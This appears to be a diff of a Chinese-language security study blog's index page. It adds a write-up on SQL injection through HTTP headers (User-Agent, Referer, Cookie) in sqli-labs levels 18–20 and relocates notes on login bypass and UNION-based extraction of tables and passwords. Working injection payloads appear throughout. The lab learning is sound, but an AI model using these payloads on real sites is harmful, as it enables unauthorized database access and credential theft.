@@ -438,7 +438,7 @@
 
 
   
-    <article id="post-盲注" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-利用burp抓包注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
   <div class="article-entry" itemprop="articleBody">
@@ -449,94 +449,60 @@
     
 
     
-    <h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1>
-    
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/10/05/%E7%9B%B2%E6%B3%A8/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-sqllab" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    
-    
-
-    
-
-    
-    <h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>每个库里都有information_schema表</p>
-<p>而每个information_schema表里都有information_schema.tables字段</p>
-<p>table_schema  库名</p>
-<p>schema_name 表名</p>
-<h3 id="简单的了解万能密码"><a href="#简单的了解万能密码" class="headerlink" title="简单的了解万能密码"></a>简单的了解万能密码</h3><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h3 id="‘or’1‘-’1"><a href="#‘or’1‘-’1" class="headerlink" title="‘or’1‘=’1"></a>‘or’1‘=’1</h3><ul>
-<li>原理：SQL语句sql=”select * from user where username=’”&amp;username&amp;”‘and password=’”&amp; password&amp;’”,当我们的密码填写’or’1’=’1提交的时候，此时语句中的password等于’or’1’=’1，那么，这条SQL语句就变成了：sql=”select * from user where username=’”&amp;username&amp;”‘and password= ‘’or’1’=’1’,然而，1=1是恒等条件，自然也就通过了程序的验证。</li>
-<li>方法：首先我们需要在密码的最前面有一个单引号，来闭合SQL语句中的单引号，然后构造一个or，也就是或者，后面加一个恒等条件即可最简单的就是1=1，同样为了使SQL语句不出错，是来闭合程序中的SQL语句的后面的单引号的，如果我们在后面再加上一个单引号的话就会出错。</li>
+    <h1 id="基于burp抓包"><a href="#基于burp抓包" class="headerlink" title="基于burp抓包"></a>基于burp抓包</h1><blockquote>
+<p>常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】</p>
+</blockquote>
+<h2 id="用户代理头部注入"><a href="#用户代理头部注入" class="headerlink" title="用户代理头部注入"></a>用户代理头部注入</h2><ul>
+<li>sqli_lab 18 源代码：</li>
 </ul>
-<h2 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h2><ul>
-<li><p>1.输入’1等字符看报错判断闭合方式</p>
-</li>
-<li><p>2.利用order by 判断列数</p>
-</li>
-<li><p>3.将数字改为-1并结合union联合查询1,2,3看一下哪列可以回显</p>
-</li>
-<li><p>4.哪列可以回显就利用哪列写group_concat()</p>
-</li>
-<li><p>5.爆库名：?id=-1‘ union select 1,group_concat(schema_name),3</p>
-</li>
-</ul>
-<p>from information_schema.schemata –+</p>
+<p><img src="C:\Users\dell\Pictures\各种截图\代理头部2.png" alt="代理头部2"></p>
 <ul>
-<li>6.爆表名：?id=-1‘ union select 1,group_concat(table_name),3</li>
+<li>$insert=”INSERT INTO <code>security</code>.<code>uagents</code> (<code>uagent</code>, <code>ip_address</code>, <code>username</code>) VALUES (‘$uagent‘, ‘$IP‘, $uname)”;将useragent和ip插入到数据库中,首先这里要输入正确的账号和密码才能绕过账号密码判断，才能进入处理uagent部分,账号和密码都是admin。</li>
+<li>print_r(mysql_error())则表示使用报错注入。</li>
 </ul>
-<p>from information_schema.tables where table_schema=’security’ –+</p>
+<p><img src="C:\Users\dell\Pictures\各种截图\用户代理头部.png"></p>
 <ul>
-<li>7.爆列名：?id=-1‘ union select 1,group_concat(column_name),3</li>
+<li>源码使用HTTP_USER_AGENT只获取了HTTP请求头的一个部分：User-Agent.而IP使用了REMOTE_ADDR，它能被代理服务器或路由器修改，但并非修改XFF头就可修改。</li>
 </ul>
-<p>from information_schema.columns where table_name=’users’ –+</p>
+<p>现在抓包改参数：</p>
+<p>![屏幕截图 2021-10-14 124401](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-14 124401.png)</p>
 <ul>
-<li>8.爆数据：?id=-1‘ union select 1,group_concat(username,’~’,password),3</li>
+<li>没有报错，同时把User_Agent的值传出来，但如果输入User_Agent值有错或者没有按照要求则会显示报错：</li>
 </ul>
-<p>from users –+     (或者：?id=-1‘ union select 1,username,password from users where id=1 –+)</p>
+<p>![屏幕截图 2021-10-14 124609](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-14 124609.png)</p>
+<ul>
+<li>使用报错注入：</li>
+</ul>
+<p><code> 1&#39; and extractvalue(1,concat(0x7e,database())) and &#39;1#</code></p>
+<p>![屏幕截图 2021-10-14 125322](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-14 125322.png)</p>
+<ul>
+<li>现在显示了库名，接下来爆表名和字段就行了</li>
+</ul>
+<p><code> 1&#39; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;))) and &#39;1#</code></p>
+<h2 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入"></a>Referer注入</h2><ul>
+<li>sqli_lab 19 源代码：</li>
+</ul>
+<p>![屏幕截图 2021-10-15 075859](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-15 075859.png)</p>
+<p>![屏幕截图 2021-10-06 190904](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-06 190904.png)</p>
+<ul>
+<li>显示从Referer入手，则输入代码：</li>
+</ul>
+<p><code>1&#39; and extractvalue(1,concat(0x7e,database())),&#39;1#</code></p>
+<h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><ul>
+<li>sqli_lab 20 源代码：</li>
+</ul>
+<p>![屏幕截图 2021-10-15 090712](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-15 090712.png)</p>
+<ul>
+<li>如果输入uname和passwd则setcookie</li>
+</ul>
+<p>![屏幕截图 2021-10-15 090922](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-15 090922.png)</p>
+<ul>
+<li><p>如果没有点击submit提交则查询cookie，通过uname传参</p>
+</li>
+<li><p>传入uname和passwd后抓包，这时再删去uname和passwd，在cookie插入<code>uname= 1&#39;and extractvalue(1,concat(0x7e,database()))#</code></p>
+</li>
+</ul>
+<p>![屏幕截图 2021-10-15 091219](C:\Users\dell\Pictures\各种截图\屏幕截图 2021-10-15 091219.png)</p>
 
     
     
@@ -551,7 +517,7 @@
 
     
     <p class="article-more-link">
-      <a class="article-more-a" href="/2021/10/02/sqllab/">展开全文 >></a>
+      <a class="article-more-a" href="/2021/10/14/%E5%88%A9%E7%94%A8burp%E6%8A%93%E5%8C%85%E6%B3%A8%E5%85%A5/">展开全文 >></a>
     </p>
     
 
@@ -653,6 +619,39 @@
 <li><p>条件：<br>1、要求多条查询 语句的查询列数是一致的<br>2、要求多条查询语句的查询的每一列的类型和最好一致<br>3、union关键字默认去重，如果使用union all 可以包含重复项</p>
 </li>
 </ul>
+<h1 id="sqli-lab-记录"><a href="#sqli-lab-记录" class="headerlink" title="sqli-lab 记录"></a>sqli-lab 记录</h1><p>每个库里都有information_schema表</p>
+<p>而每个information_schema表里都有information_schema.tables字段</p>
+<p>table_schema  库名</p>
+<p>schema_name 表名</p>
+<h3 id="简单的了解万能密码"><a href="#简单的了解万能密码" class="headerlink" title="简单的了解万能密码"></a>简单的了解万能密码</h3><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h3 id="‘or’1‘-’1"><a href="#‘or’1‘-’1" class="headerlink" title="‘or’1‘=’1"></a>‘or’1‘=’1</h3><ul>
+<li>原理：SQL语句sql=”select * from user where username=’”&amp;username&amp;”‘and password=’”&amp; password&amp;’”,当我们的密码填写’or’1’=’1提交的时候，此时语句中的password等于’or’1’=’1，那么，这条SQL语句就变成了：sql=”select * from user where username=’”&amp;username&amp;”‘and password= ‘’or’1’=’1’,然而，1=1是恒等条件，自然也就通过了程序的验证。</li>
+<li>方法：首先我们需要在密码的最前面有一个单引号，来闭合SQL语句中的单引号，然后构造一个or，也就是或者，后面加一个恒等条件即可最简单的就是1=1，同样为了使SQL语句不出错，是来闭合程序中的SQL语句的后面的单引号的，如果我们在后面再加上一个单引号的话就会出错。</li>
+</ul>
+<h2 id="做题步骤"><a href="#做题步骤" class="headerlink" title="做题步骤"></a>做题步骤</h2><ul>
+<li><p>1.输入’1等字符看报错判断闭合方式</p>
+</li>
+<li><p>2.利用order by 判断列数</p>
+</li>
+<li><p>3.将数字改为-1并结合union联合查询1,2,3看一下哪列可以回显</p>
+</li>
+<li><p>4.哪列可以回显就利用哪列写group_concat()</p>
+</li>
+<li><p>5.爆库名：?id=-1‘ union select 1,group_concat(schema_name),3</p>
+</li>
+</ul>
+<p>from information_schema.schemata –+</p>
+<ul>
+<li>6.爆表名：?id=-1‘ union select 1,group_concat(table_name),3</li>
+</ul>
+<p>from information_schema.tables where table_schema=’security’ –+</p>
+<ul>
+<li>7.爆列名：?id=-1‘ union select 1,group_concat(column_name),3</li>
+</ul>
+<p>from information_schema.columns where table_name=’users’ –+</p>
+<ul>
+<li>8.爆数据：?id=-1‘ union select 1,group_concat(username,’~’,password),3</li>
+</ul>
+<p>from users –+     (或者：?id=-1‘ union select 1,username,password from users where id=1 –+)</p>
 
     
     
